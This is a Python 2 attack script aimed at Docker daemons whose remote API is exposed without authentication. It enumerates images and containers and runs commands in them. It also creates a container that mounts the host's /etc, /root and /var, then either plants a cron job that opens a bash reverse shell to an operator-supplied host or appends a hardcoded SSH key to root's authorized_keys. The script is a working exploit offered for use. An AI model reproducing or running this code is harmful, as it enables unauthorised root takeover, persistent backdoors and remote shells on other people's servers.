import urllib2
import urllib
import json
import sys
import getopt
from docker import Client

def http_get(url):
    response = urllib2.urlopen(url)
    return response.read()

def http_post(url, values):
    jdata = values
    #print url
    #print jdata
    send_headers = {
        'Content-Type':'application/json'
    }
    req = urllib2.Request(url, data=jdata,headers=send_headers)
    response = urllib2.urlopen(req)
    return response.read()

def isset(v):
    try :
        type(eval(v))
    except:
        return 0
    else:
        return 1

def printport(portsList, name):
    if isset("portsList['IP']") == 0:
        portsList['IP']="*"
        printport(portsList,name)
    elif isset("portsList['Type']") == 0:
        portsList['Type']="*"
        printport(portsList,name)
    elif isset("portsList['PublicPort']") == 0:
        portsList['PublicPort']="*"
        printport(portsList,name)
    elif isset("portsList['PrivatePort']") == 0:
        portsList['PrivatePort']="*"
        printport(portsList,name)
    else:
        print "[-]"+name+"[+]"+portsList['Type']+"[-]"+portsList['IP']+":"+str(portsList['PrivatePort'])+" --> "+host+":"+str(portsList['PublicPort'])

def createClient(host,port,version):
    clientApiVersion = getversion(host,port,version)
    print "[-]ClientApiVersion:"+clientApiVersion
    cli = Client(base_url='tcp://'+host+':'+port,version=clientApiVersion)
    return cli

def getversion(host,port,version):
    url = "http://"+host+":"+port+"/version"
    ret = json.loads(http_get(url))
    if version != '':
        clientApiVersion = version
    else:
        clientApiVersion = ret['ApiVersion']
    return clientApiVersion

def printContainer(host,port,version,allContainer):
    cli = createClient(host,port,version)
    if allContainer == 1:
        ret = cli.containers(all=True)
    else:
        ret = cli.containers()
    for info in ret:
        print "[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]"
        print "[-] id: "+info['Id']
        print "[-] Names: "+info['Names'][0]
        print "[-] Image: "+info['Image']
        print "[-] Status: "+info['Status']
    print "[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]"

if __name__ == "__main__":
    opts, args = getopt.getopt(sys.argv[1:], "v:kaVCcsLli:e:h:p:H:P:I:")
    key = 0
    version =''
    payload =''
    sshkey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClkFaGdsYMiDdXgnoucv6HG42ydk1IJS3oBGUu0uBkCXds6eVVaEmqe/HY4ICUPIyaoynJl7sIs9Ktuu1B91QIWYsbbMAtMN4v4ZZXWQ0gKTokUhGcjMuyJUHGiHWKEwqKpDGeB15EtS0wstO273PmaFLAnKY6lyAvpY9/Sgfq6UrGQnBR1P2BAg31UWsXKiBqUqunbTuicZPvQUdLW+iKzIDegjonZZDwiW9Ak5Bn6bSOahUR6gg827fkxX7TLj4cSna7RyKrL5ERw61mHqRpdvMjhJAvAz24kJWYC5kDDyxi+7HYRDKophEk7ORTt18QeuoiW55XjGx2jHzoDZtp'
    for op, value in opts:
        if op =="-l":
            imagesList = 1
        elif op == "-i":
            imageName = value
        elif op == "-e":
            dataExec = value
        elif op == "-h":
            host = value
        elif op =='-p':
            port = value
        elif op == '-L':
            portList = 1
        elif op == '-H':
            lhsot = value
        elif op == '-P':
            lport = value
        elif op =='-C':
            createContainer = 1
        elif op == '-v':
            version = value
        elif op == '-V':
            version = 1
        elif op == '-c':
            closeContainer = 1
        elif op == '-I':
            imageId = value
        elif op == '-a':
            allContainer = 1
        elif op == '-s':
            startContainer = 1
        elif op == '-k':
            key = 1
            
    if isset('lhsot') and isset('lport'):
        #payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/crontabs/root"' #ubuntu failure,beacuse It need to restart the cron or system
        payload = '/bin/bash -c "echo \\\"*/1 * * * * root /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp2/crontab"' #ubuntu 
        #payload = '/bin/bash -c "echo \\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\" >> /tmp/spool/cron/root"'  #centos,redhat and so on
        print "[-]Paylaod: "+payload
    if sshkey !='' and key == 1:
        payload = '/bin/bash -c "echo \\\"'+sshkey+'\\\" >> /tmp1/.ssh/authorized_keys"'
        print "[-]Paylaod: "+payload
    if isset('host') and isset('port'):
        if isset('version') and version == 1:
            url = "http://"+host+":"+port+"/version"
            ret = json.loads(http_get(url))
            print "[-] ApiVersion: "+ret['ApiVersion']
        elif isset('imagesList'):
            url = "http://"+host+":"+port+"/images/json"
            ret = json.loads(http_get(url))
            for info in ret:
                print "RepoTags: "+info['RepoTags'][0]
        elif isset('createContainer') and isset('imageName'):
            cli = createClient(host,port,version)
            container = cli.create_container(image=imageName, command='/bin/bash', tty=True, volumes=['/tmp','/tmp1','/tmp2'], host_config=cli.create_host_config(binds=['/var:/tmp:rw','/root:/tmp1:rw','/etc:/tmp2:rw']))
            print "[-]Container ID:"+container['Id']
            print "[-]Warning:"+str(container['Warnings'])
            response = cli.start(container=container.get('Id'))
            if payload != '':
                print cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload))
                if key == 1:
                    cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd='chmod 600 /tmp1/.ssh/authorized_keys'))
                    print "[-]chmod 600 authorized_keys ......"
        elif isset('closeContainer') and isset('imageId'):
            cli = createClient(host,port,version)
            cli.stop(container=imageId)
            cli.remove_container(container=imageId)
        elif isset('startContainer') and isset('imageId'):
            cli = createClient(host,port,version)
            cli.start(container=imageId)
        elif isset('dataExec') and isset('imageId'):
            cli = createClient(host,port,version)
            print "[-]Command:"+dataExec
            print cli.exec_start(exec_id=cli.exec_create(container=imageId, cmd=dataExec))
        elif isset('portList'):
            url = "http://"+host+":"+port+"/containers/json"
            ret = json.loads(http_get(url))
            for pl in ret:
                if isset("pl['Names'][0]"):
                    name = pl['Names'][0]
                else:
                    name = '*'
                for portsList in pl['Ports']:
                    printport(portsList, name)
        else:
            if isset('allContainer'):
                printContainer(host,port,version,allContainer)
            else:
                printContainer(host,port,version,0)
